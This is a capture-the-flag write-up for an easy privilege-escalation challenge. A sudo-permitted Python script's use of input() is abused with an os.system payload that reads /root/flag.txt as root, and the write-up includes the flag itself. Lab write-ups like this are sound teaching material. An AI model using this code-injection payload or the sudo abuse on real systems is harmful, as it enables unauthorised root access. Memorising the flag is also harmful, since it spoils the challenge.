Event: NCA CTF  
Category: #Pentest #Easy 

---

## ğŸ“Œ Challenge Information

- Points: 890
    
- Difficulty: #Easy
    
- Credentials:
    
    - Username: `ctfplayer`
        
    - Password: `ctfplayer`
        

---

## ğŸ“ Challenge Description

The challenge provides a user `ctfplayer` with limited permissions on the system. The user is allowed to execute a Python script `/opt/script.py` using `sudo` without a password. The goal is to leverage this access to escalate privileges and read the root flag located at `/root/flag.txt`.

---

# ğŸ” Initial Enumeration

### Step 1 â€“ Basic Check

```bash
whoami
# Output: ctfplayer

ls /root
# Output: ls: can't open '/root': Permission denied
```

### Step 2 â€“ Check Hidden Files

```bash
ls -a
# Checked for hidden scripts, configs, or backup files
```

### Step 3 â€“ Additional Enumeration

```bash
sudo -l
# Output: User ctfplayer may run the following commands on 064c3b8c7f82:
# (ALL) NOPASSWD: /usr/local/bin/python /opt/script.py

cat /opt/script.py
# Output:
# print("Simple Addition Program")
# print("Enter first number:")
# num1 = input(">>> ")
# print("Enter second number:")
# num2 = input(">>> ")
# result = num1 + num2
# print("Result:", result)
```

---

## ğŸ‘€ Observations

- `ctfplayer` cannot directly access `/root/flag.txt`.
    
- `sudo -l` reveals that the user can execute `/opt/script.py` using `/usr/local/bin/python` without a password.
    
- `/opt/script.py` is a simple Python addition program.
    
- Using the `input()` in Python 2/3 with `__import__('os').system()` allows arbitrary command execution.
    
- Direct `sudo python2 -c ...` fails because the user is restricted to a specific Python path and script.
    

---

# ğŸš§ Problem Identified

Main trick:

- **Sudo restriction:** The user can only execute `/usr/local/bin/python /opt/script.py` as root.
    
- **Python script input:** Using `input()` in the Python script allows arbitrary code injection if evaluated as Python objects (Python 2 behavior).
    
- **Privilege escalation via script abuse:** The script can be exploited to run `os.system()` commands with root privileges.
    

---

# ğŸ›  Exploitation / Solution

## Method Used

We leverage the `input()` function in the Python script. By passing the payload as the first number:

```python
__import__('os').system('cat /root/flag.txt')
```

This is executed as root because of the `sudo` permission, allowing us to read the root flag.

Explanation:

- The Python script uses `input()`, which evaluates the input as a Python expression (Python 2 behavior).
    
- `__import__('os').system()` allows us to execute arbitrary shell commands.
    
- Running the script with `sudo` gives root privileges to these commands.
    

---

## Alternative Method (If Any)

- Attempting `sudo python2 -c 'import os; os.system("cat /root/flag.txt")'` fails because `sudo` restricts the executable path.
    
- Other methods would require exploitation of `input()` or script vulnerabilities, but this direct Python injection is the simplest.
    

---

# ğŸ“¤ Command Used to Retrieve the Flag

```bash
sudo /usr/local/bin/python /opt/script.py
# Then input at prompt:
# >>> __import__('os').system('cat /root/flag.txt')
```

Output:

```
NCA{Using_0ld_vErSion_1N_VU1NEr4Ble_wAY_WoWWWW_87c7cb28ea95}
```

---

# ğŸš© Final Flag

```
NCA{Using_0ld_vErSion_1N_VU1NEr4Ble_wAY_WoWWWW_87c7cb28ea95}
```

---

# ğŸ§  Key Takeaways

- Always check `sudo -l` to identify potential privilege escalation vectors.
    
- Scripts run with `sudo` can often be abused via input evaluation or unsafe functions.
    
- Pythonâ€™s `input()` in Python 2 can evaluate arbitrary expressions, which can lead to command execution.
    
- Knowing the exact path and restrictions is key when sudo allows only specific commands.
    

---

# ğŸ“š Skills Practiced

- Linux enumeration
    
- Sudo permissions analysis
    
- Python input code injection
    
- Privilege escalation via script abuse
    
- Root flag retrieval
    

---

# ğŸ Personal Reflection

Next time, I would check `sudo -l` and inspect all user-owned scripts for exploitable inputs before trying complicated workarounds. Recognizing Python 2â€™s `input()` vulnerability saved time.
